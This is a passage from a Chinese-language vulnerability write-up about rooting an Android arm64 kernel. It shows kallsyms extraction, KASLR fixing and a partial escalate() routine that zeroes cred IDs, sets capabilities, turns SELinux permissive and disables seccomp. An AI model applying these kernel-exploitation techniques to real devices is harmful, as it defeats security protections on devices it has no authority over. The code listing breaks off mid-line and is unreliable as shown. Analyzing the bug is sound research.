        [+]kallsyms_arch = arm64
        [!]could be offset table...
        [!]lookup_address_table error...
        [!]get kallsyms error...
    4. 用[droidimg](https://github.com/nforest/droidimg)中的工具修复Image
                $ gcc -o fix_kaslr_arm64 fix_kaslr_arm64.c
        fix_kaslr_arm64.c:269:5: warning: always_inline function might not be inlinable [-Wattributes]
         int main(int argc, char **argv)
             ^~~~
        $ ./fix_kaslr_arm64 Image Image_kaslr
        Origiellnal kernel: Image, output file: Image_kaslr
        kern_buf @ 0x7f7eb403c000, mmap_size = 37502976
        rela_start = 0xffffff8009916430
        p->info = 0x0sh
        rela_end = 0xffffff800a1b0340
        375847 entries processed
    5. 最后导出符号表
                $ ./vmlinux.py Image_kaslr > syms.txt
        Linux version 4.4.169-gee9976dde895 (android-build@abfarm325) (Android clang version 5.0.300080 (based on LLVM 5.0.300080)) #1 SMP PREEMPT Wed Mar 6 01:42:27 UTC 2019
        [+]kallsyms_arch = arm64
        [+]numsyms: 131300
        [+]kallsyms_address_table = 0x11eb300
        [+]kallsyms_num = 131300 (131300)
        [+]kallsyms_name_table = 0x12ebc00
        [+]kallsyms_type_table = 0x0
        [+]kallsyms_marker_table = 0x14a4a00
        [+]kallsyms_token_table = 0x14a5b00
        [+]kallsyms_token_index_table = 0x14a5f00
        [+]kallsyms_start_address = 0xffffff8008080000L
        [+]found 9917 symbols in ksymta
    6. 根据导出符号表的地址和基址(`kallsyms_start_address = 0xffffff8008080000L`)计算偏移
  * 内核基址
有了符号表偏移后要计算基址只需泄露出某个符号的地址再减去符号表中该符号的偏移即可。
`poc2.c`中的做法是找：`task_struct->mm->user_ns`地址，减去`init_user_ns`偏移。
  * 修改属性
直接用基址+偏移的方式找到系统属性的地址再修改即可
## 漏洞利用——提权
poc3.c中，`escalate`函数利用之前获得的内核读写权限进行提权。为了得到`full
root`即完整root权限，需要绕过linux中多个安全机制（这里仅提出所绕过安全机制的类型，并不对机制做详细解释），不过有了内核读写权限后绕过也不是特别麻烦。权部分代码（其中`DEBUG_RW`用于打印额外信息帮助理解）：
    void escalate()
    {
      ......
      uid_t uid = getuid();
      unsigned long my_cred = kernel_read_ulong(current_ptr + OFFSET__task_struct__cred);
      // offset 0x78 is pointer to void * security
      unsigned long current_cred_security = kernel_read_ulong(my_cred+0x78);
      printf("current->cred == 0x%lx\n", my_cred);
      printf("Starting as uid %u\n", uid);
      printf("Escalating...\n");
      // change IDs to root (there are eight)
      for (int i = 0; i  Discretionary Access Control——自由访问控制
获取内核读写权限的过程中我们得到了`task_struct`的指针，而`task_struct`是linux内核中被称为进程描述符的结构体，它包含了一个进程中的各种信息，其中的成员变量`cred`是和该进程权限有关的结构体，[定义](https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred)如下：
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;    /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC  0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
        kuid_t      uid;        /* real UID of the task */
        kgid_t      gid;        /* real GID of the task */
        kuid_t      suid;       /* saved UID of the task */
        kgid_t      sgid;       /* saved GID of the task */
        kuid_t      euid;       /* effective UID of the task */
        kgid_t      egid;       /* effective GID of the task */
        kuid_t      fsuid;      /* UID for VFS ops */
        kgid_t      fsgid;      /* GID for VFS ops */
        unsigned    securebits; /* SUID-less security management */
        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
        kernel_cap_t    cap_permitted;  /* caps we're permitted */
        kernel_cap_t    cap_effective;  /* caps we can actually use */
        kernel_cap_t    cap_bset;   /* capability bounding set */
        kernel_cap_t    cap_ambient;    /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char   jit_keyring;    /* default keyring to attach requested
                         * keys to */
        struct key __rcu *session_keyring; /* keyring inherited over fork */
        struct key  *process_keyring; /* keyring private to this process */
        struct key  *thread_keyring; /* keyring private to this thread */
        struct key  *request_key_auth; /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;  /* subjective LSM security */
    #endif
        struct user_struct *user;   /* real user ID subscription */
        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;  /* supplementary groups for euid/fsgid */
        struct rcu_head rcu;        /* RCU deletion hook */
    } __randomize_layout;
`escalate`中首先通过基址加偏移得到`cred`地址，然后将该结构体中的`uid`到`fsgid`修改为0，提权为root。虽然此时已经成为root，但是由于其他linux安全机制的存在，现在的root并没有获得完全的系统控制权，因此后面还修改了其他值。
### CAP
> Linux Capabilities——Linux能力
CAP对应在`cred`中`kernel_cap_t`类型的成员变量
### MAC
> Mandatory Access Control——强制访问控制
MAC在此处指SELinux。
这里原poc3作者最初想法是修改`cred`结构体中的`void
*security`指向的`task_security_struct`结构体中的sid值，将进程从shell级别修改为更高特权级别，如`sid=1`。但在poc运行到此处时就卡住了无法继续运行，之后原作者采取了另一个方法也就是修改内核直接将SELinux的模式设置为`permissive`。
根据符号`selinux_enforcing`偏移获取地址，将该地址值写为0即可将SELinux状态改为`permissive`
### SECCOMP
> securecomputing mode——限制进程对系统调用的访问
SECCOMP对在adb用运行的poc无影响，但是会阻止捆绑在app上poc的系统调用。
在`task_struct`结构中找到：
    struct seccomp {
        int mode;
        struct seccomp_filter *filter;
    };
其中`mode`有两种模式：`SECCOMP_MODE_STRICT`和`SECCOMP_MODE_FILTER`，通常工作在filter模式下，当mode设置为0时，seccomp为禁用状态。
但是如果只将mode写为0不会禁用SECCOMP，原因是当SECCOMP运行时，在`task_struct->thread_info.flags`会被设置为`TIF_SECCOMP`，由于flag没有修改，内核认为SECCOMP处于开启状态，所以内核依旧会调用`__secure_computing`，进入该函数时会由于mode为0跳转到`BUG()`，原本的系统调用仍然不会执行。
    int __secure_computing(const struct seccomp_data *sd)
    {
        int mode = current->seccomp.mode;
    ......
        switch (mode) {
        case SECCOMP_MODE_STRICT:
            __secure_computing_strict(this_syscall);  /* may call do_exit */
            return 0;
        case SECCOMP_MODE_FILTER:
            return __seccomp_filter(this_syscall, sd, false);
        default:
            BUG();
        }
    }
因此mode和flags都需要覆盖。
* * *
至此我们获得了完整的root权限。
## 总结
自身分析漏洞的经验不多，由于漏洞的利用过程不算复杂加上几乎稳定触发所以自己还算完整地把整个流程跟了一遍，最后还要感谢ghost师傅的指点。